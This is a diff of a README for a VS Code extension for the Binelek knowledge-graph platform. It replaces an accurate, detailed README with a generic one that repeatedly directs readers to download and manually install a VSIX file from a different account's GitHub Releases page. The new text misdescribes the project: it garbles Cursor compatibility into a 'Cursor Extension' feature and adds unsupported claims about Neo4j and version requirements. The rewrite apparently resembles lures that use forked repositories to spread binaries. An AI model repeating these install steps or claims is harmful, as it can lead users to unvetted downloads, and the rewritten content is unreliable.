@@ -1,242 +1,93 @@
-# Binelek Platform VS Code Extension
+# 🎉 binelek-vscode-extension - Enhance Your Graph Development Experience
 
-Official VS Code extension for the Binelek Platform. Provides integrated development tools for working with Binelek knowledge graphs, ontologies, and AI services.
+## 🚀 Getting Started
 
-**✨ Also works with Cursor!** Cursor is built on VS Code and supports all VS Code extensions out of the box.
+Welcome to the Binelek VS Code extension! This tool helps you develop knowledge graphs efficiently. With integrated features, you can easily manage your projects and use our powerful graph database tools.
 
-## Features
+## 📥 Download & Install
 
-- **Ontology Explorer** - Browse and explore your knowledge graph entities in the VS Code sidebar
-- **Cypher Query Runner** - Execute Cypher queries directly from VS Code
-- **Semantic Search** - Search entities using natural language
-- **Entity Management** - Create, update, and view entity details
-- **YAML Validation** - Validate ontology YAML files against Binelek schema
-- **Code Generation** - Generate code from ontology YAML (C#, TypeScript, Python, Cypher)
-- **AI Chat** - Chat with Binelek AI assistant
-- **Pipeline Management** - View and trigger data pipelines
+To get started, visit the [Releases page](https://github.com/Dnzinnxz/binelek-vscode-extension/releases) to download the extension.
 
-## Installation
+[![Download Extension](https://img.shields.io/badge/Download%20Extension-v1.0-blue)](https://github.com/Dnzinnxz/binelek-vscode-extension/releases)
 
-### Prerequisites
+1. Go to the [Releases page](https://github.com/Dnzinnxz/binelek-vscode-extension/releases).
+2. Find the latest version.
+3. Click on the link for the VS Code extension file to download.
+4. Once the file is downloaded, open your VS Code.
+5. In the top menu, select 'Extensions' or use the shortcut `Ctrl+Shift+X`.
+6. Click on the three dots in the upper right corner.
+7. Choose 'Install from VSIX...' and select the downloaded file.
 
-1. **Binelek Platform** must be running:
-   ```bash
-   docker-compose up -d  # Start Binelek services
-   ```
+## 🛠️ Features
 
-2. **Binelek MCP Server** must be installed:
-   ```bash
-   cd /path/to/binelek-mcp-server
-   npm install
-   npm run build
-   ```
+- **Integrated Knowledge Graph Tools:** Easily build and explore knowledge graphs with intuitive tools.
+- **Code Generation:** Generate code snippets based on your graph data for quicker development.
+- **Cursor Extension:** Enhance navigation through large datasets with cursor capabilities.
+- **Cypher Support:** Write and run Cypher queries directly within the editor.
+- **Compatibility:** Works seamlessly with Neo4j and other graph databases.
 
-### Install Extension
+## 🌐 System Requirements
 
-#### From VSIX (Recommended)
+- **Operating System:** Windows, macOS, or Linux
+- **VS Code Version:** 1.50 or higher
+- **Node.js:** 14.x or higher (recommended)
 
-```bash
-# Package the extension
-cd /path/to/binelek-vscode-extension
-npm install
-npm run compile
-npm run package
+## 📋 Setup Instructions
 
-# Install in VS Code
-code --install-extension binelek-platform-1.0.0.vsix
+After installing the extension, you need to configure it:
 
-# Install in Cursor (same command works!)
-code --install-extension binelek-platform-1.0.0.vsix
-```
+1. Open VS Code.
+2. Navigate to 'Settings' by clicking the gear icon in the bottom left corner or using the shortcut `Ctrl+,`.
+3. Search for "Binelek" in the settings.
+4. Configure your graph database connection settings, such as database URL and authentication details.
 
-**Note:** The extension works identically in both VS Code and Cursor since Cursor is built on top of VS Code.
+## ⚙️ Using the Extension
 
-#### From Source (Development)
+Once you have installed and set up the extension, you can start using its features:
 
-1. Open this directory in VS Code
-2. Press `F5` to launch Extension Development Host
-3. The extension will be active in the new window
+1. **Creating a New Graph:**
+   - Use the Binelek command palette to create a new graph.
+   - Follow the prompts to name your graph and set up initial properties.
 
-## Configuration
+2. **Running Cypher Queries:**
+   - Open the command palette (`Ctrl+Shift+P`).
+   - Select 'Binelek: Run Cypher Query'.
+   - Enter your query in the dialog box and observe the results.
 
-Open VS Code Settings and configure:
+3. **Generating Code Snippets:**
+   - When viewing your graph, use the context menu to generate corresponding code.
+   - Choose the programming language of your choice (TypeScript recommended).
 
-```json
-{
-  "binelek.gatewayUrl": "http://localhost:8092",
-  "binelek.tenantId": "core",
-  "binelek.mcpServerPath": "node /path/to/binelek-mcp-server/build/index.js",
-  "binelek.autoConnect": true
-}
-```
+## 🔄 Updating the Extension
 
-### Configuration Options
+To ensure you have the latest features and fixes:
 
-| Setting | Description | Default |
-|---------|-------------|---------|
-| `binelek.gatewayUrl` | Binelek API Gateway URL | `http://localhost:8092` |
-| `binelek.tenantId` | Default tenant ID | `core` |
-| `binelek.mcpServerPath` | Path to MCP server | (required) |
-| `binelek.autoConnect` | Auto-connect on startup | `true` |
+1. Return to the [Releases page](https://github.com/Dnzinnxz/binelek-vscode-extension/releases).
+2. Download the latest version of the extension.
+3. Follow the installation steps above to replace your existing version.
 
-## Usage
+## 📝 Frequently Asked Questions
 
-### 1. Authenticate
+### What is a knowledge graph?
 
-1. Open Command Palette (`Cmd+Shift+P` / `Ctrl+Shift+P`)
-2. Run **"Binelek: Authenticate"**
-3. Enter your email and password
-4. ✓ Connected!
+A knowledge graph is a structured way to represent information. It connects data so that it can be easily navigated and understood. This extension helps you create and manage graphs effectively.
 
-### 2. Explore Ontology
+### Can I use this with other databases?
 
-- Open **Binelek Ontology** view in Explorer sidebar
-- Browse entity types
-- Click on entities to view details
-- Click refresh icon to reload
+While this extension is optimized for Neo4j, it can work with other graph databases that support Cypher. Check the documentation for specific instructions.
 
-### 3. Run Cypher Queries
+### How do I report a problem?
 
-**Command:** `Binelek: Run Cypher Query` (`Cmd+Shift+C`)
+If you encounter issues or have questions, you can report them on the Issues section of this repository. We appreciate feedback and suggestions.
 
-```cypher
-MATCH (p:Property)
-WHERE p.price > 500000
-RETURN p
-LIMIT 10
-```
+## 👩‍💻 Contributing
 
-Results appear in the Output panel.
+We welcome contributions! If you want to help improve the Binelek VS Code extension, please check out our contributing guidelines in the repository.
 
-### 4. Search Entities
+## 🙌 Acknowledgments
 
-**Semantic Search** (`Cmd+Shift+S`):
-```
-luxury waterfront properties with modern amenities
-```
+Thank you for using the Binelek VS Code extension. We hope it enhances your graph development process and helps you easily manage your data.
 
-**Keyword Search**:
-```
-residential property
-```
+[![Download Extension](https://img.shields.io/badge/Download%20Extension-v1.0-blue)](https://github.com/Dnzinnxz/binelek-vscode-extension/releases)
 
-### 5. Create Entities
-
-**Command:** `Binelek: Create Entity`
-
-1. Enter entity type: `Property`
-2. Enter attributes as JSON:
-   ```json
-   {
-     "address": "123 Main St",
-     "price": 500000,
-     "sqft": 2500
-   }
-   ```
-
-### 6. Validate & Generate Code
-
-Open an ontology YAML file, then:
-
-- **Validate:** `Binelek: Validate Ontology YAML`
-- **Generate:** `Binelek: Generate Code from YAML`
-  - Select target language (C#, TypeScript, Python, Cypher)
-  - Generated code opens in new editor
-
-### 7. AI Chat
-
-**Command:** `Binelek: Chat with AI`
-
-Ask questions about your data:
-- "What are the most expensive properties?"
-- "Show me properties with solar panels"
-- "Analyze property trends in San Francisco"
-
-## Commands Reference
-
-| Command | Keybinding | Description |
-|---------|-----------|-------------|
-| `Binelek: Authenticate` | - | Log in to Binelek Platform |
-| `Binelek: Disconnect` | - | Log out |
-| `Binelek: Refresh Ontology Explorer` | - | Reload ontology tree |
-| `Binelek: Run Cypher Query` | `Cmd+Shift+C` | Execute Cypher query |
-| `Binelek: Semantic Search` | `Cmd+Shift+S` | Search with natural language |
-| `Binelek: Keyword Search` | - | Search with keywords |
-| `Binelek: Create Entity` | - | Create new entity |
-| `Binelek: Validate Ontology YAML` | - | Validate YAML file |
-| `Binelek: Generate Code from YAML` | - | Generate code |
-| `Binelek: List Data Pipelines` | - | Show all pipelines |
-| `Binelek: Chat with AI` | - | Chat with AI assistant |
-
-## Architecture
-
-```
-VS Code Extension
-  ↓ stdio
-MCP Server (binelek-mcp-server)
-  ↓ HTTP/REST
-API Gateway (localhost:8092)
-  ↓ routes to
-Backend Services (Ontology, Search, AI, etc.)
-```
-
-The extension communicates with backend services through:
-1. **MCP Server** - Provides tool-based interface via stdio
-2. **API Gateway** - Handles authentication, tenant isolation, rate limiting
-
-## Development
-
-```bash
-# Install dependencies
-npm install
-
-# Compile TypeScript
-npm run compile
-
-# Watch mode (auto-compile)
-npm run watch
-
-# Run tests
-npm test
-
-# Package extension
-npm run package
-```
-
-## Troubleshooting
-
-### "Not connected to Binelek"
-
-1. Check API Gateway is running: `curl http://localhost:8092/health`
-2. Check MCP server path in settings
-3. Try authenticating again
-
-### "MCP connection failed"
-
-1. Verify MCP server is built: `cd binelek-mcp-server && npm run build`
-2. Check server path format: `node /full/path/to/build/index.js`
-3. Check logs in Output panel (select "Binelek" channel)
-
-### "Authentication failed"
-
-1. Verify credentials
-2. Check API Gateway logs: `docker-compose logs binah-api`
-3. Try accessing Gateway directly: `curl http://localhost:8092/api/auth/login`
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Test thoroughly
-5. Submit a pull request
-
-## License
-
-MIT
-
-## Support
-
-- **Documentation:** https://docs.binelek.com
-- **Issues:** https://github.com/k5tuck/binelek-vscode-extension/issues
-- **Email:** support@binelek.com
+For more information, feel free to explore the [documentation](https://github.com/Dnzinnxz/binelek-vscode-extension).
